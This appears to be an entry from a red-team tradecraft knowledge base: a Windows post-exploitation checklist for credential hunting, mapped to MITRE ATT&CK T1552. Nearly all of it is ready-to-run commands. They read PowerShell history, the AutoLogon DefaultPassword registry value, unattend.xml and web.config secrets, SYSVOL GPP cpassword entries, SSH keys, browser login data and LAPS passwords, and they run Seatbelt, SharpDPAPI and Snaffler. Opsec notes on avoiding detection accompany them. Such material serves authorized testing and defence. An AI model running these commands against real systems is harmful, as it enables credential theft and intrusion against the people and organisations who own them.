---
name: Credential Hunting Checklist
category: credential-access
subcategories: [credential-discovery, file-based-creds, registry-creds, checklist]
tradecraft_tags: [credentials, hunting, checklist, files, registry, environment, technique]
mitre_attack:
  - id: T1552
    name: Unsecured Credentials
  - id: T1552.001
    name: Unsecured Credentials — Credentials In Files
  - id: T1552.002
    name: Unsecured Credentials — Credentials in Registry
source:
  url: https://attack.mitre.org/techniques/T1552/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  File access patterns when reading many credential-related files (password managers,
  config files) — detectable by DLP and file access monitoring. Registry reads are
  largely unmonitored by default. PowerShell history file reads generate Sysmon file
  access events.
usage_examples:
  - description: PowerShell history file (often contains cleartext credentials)
    args: "type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
  - description: Credential Manager via cmdkey
    args: "cmdkey /list"
  - description: Network credentials in the registry
    args: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
  - description: Look for password files in common locations
    args: "dir /s /b C:\\Users /a:-d | findstr /i password.txt creds.txt secrets.txt"
  - description: Seatbelt comprehensive credential check
    args: "Seatbelt.exe CredEnum WindowsCredentialFiles TokenPrivileges DpapiMasterKeys"
opsec_notes: |
  Most file-based credential hunting is low-risk from a detection perspective — file
  reads don't generate network traffic or unusual process activity. Key exception:
  reading many files rapidly may trigger DLP (if deployed). PowerShell history is
  particularly valuable — operators often run credential-related commands without
  realizing the history is retained.
gotchas: |
  This is a CHECKLIST, not a tool. The locations listed below represent common
  credential storage locations on Windows. Use built-in tools (type, dir, reg query)
  or Seatbelt for enumeration. High-value credential discovery often comes from
  unexpected places — PowerShell history, unattended setup files, web.config files.
related_ttps: [seatbelt, sharpdpapi, snaffler, sharpchromium]
alternatives: [seatbelt, lazagne, sharpdpapi]
common_args: {}
last_updated: 2026-05-29
---

# Credential Hunting Checklist

A comprehensive reference for post-exploitation credential discovery locations on
Windows systems. These locations are checked via built-in tools (type, dir, reg query)
or Seatbelt — no binary upload required for most checks.

## High-Value Quick Checks

### 1. PowerShell History (VERY HIGH VALUE — frequently contains credentials)
```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# All users:
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
```

### 2. Windows Credential Manager
```
cmdkey /list                    # List stored credentials
# Decrypt with: SharpDPAPI credentials
```

### 3. Windows AutoLogon
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

### 4. Unattended Setup Files
```
dir /s /b C:\Windows\Panther\unattend*.xml
dir /s /b C:\Windows\System32\sysprep\*
type "C:\Windows\Panther\Unattend.xml"     # Plaintext or base64 password
```

### 5. Web Application Config Files
```
dir /s /b C:\inetpub /a:-d | findstr /i web.config
findstr /si "password" C:\inetpub\*.config
# Common: connectionStrings with SQL credentials
```

### 6. GPP Passwords (SYSVOL)
```
findstr /s /i cpassword \\DOMAIN\sysvol\DOMAIN\Policies\*.xml
# Decrypt value: SharpUp DomainGPPPassword
```

### 7. Application Credentials
```
# Common application credential locations:
dir /s /b C:\Program Files /a:-d | findstr /i "password.txt creds.ini config.xml"
dir /s /b C:\ProgramData /a:-d | findstr /i "password.txt settings.ini"
```

### 8. SSH Keys
```
dir /s /b C:\Users\*\.ssh\
dir /s /b C:\ProgramData\SSH\
```

### 9. Browser Credentials
```
# Chrome/Edge/Brave: SharpChromium or SharpDPAPI /target:chrome
# Stored in: %APPDATA%\Local\Google\Chrome\User Data\Default\Login Data
```

### 10. Environment Variables
```
set | findstr /i "pass token key secret"
```

### 11. LAPS (if deployed)
```
# Read via PowerView or LDAP (if readable):
Get-DomainComputer HOSTNAME -Properties ms-Mcs-AdmPwd
```

### 12. Sticky Notes / OneNote
```
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Sticky Notes
dir /s /b C:\Users\*\Documents\OneNote
```

### 13. DPAPI-Protected Credentials
```
# Enumerate: Seatbelt DpapiMasterKeys, CredEnum, WindowsCredentialFiles
# Decrypt: SharpDPAPI triage (or with domain backup key)
```

## Automated Coverage

**Seatbelt comprehensive run:**
```
Seatbelt.exe CredEnum WindowsCredentialFiles TokenPrivileges DpapiMasterKeys 
             PowerShellHistory RegistryAutoLogon CachedGPPPassword
```

**Snaffler (network share hunting):**
```
Snaffler.exe -s -o snaffler.log
```
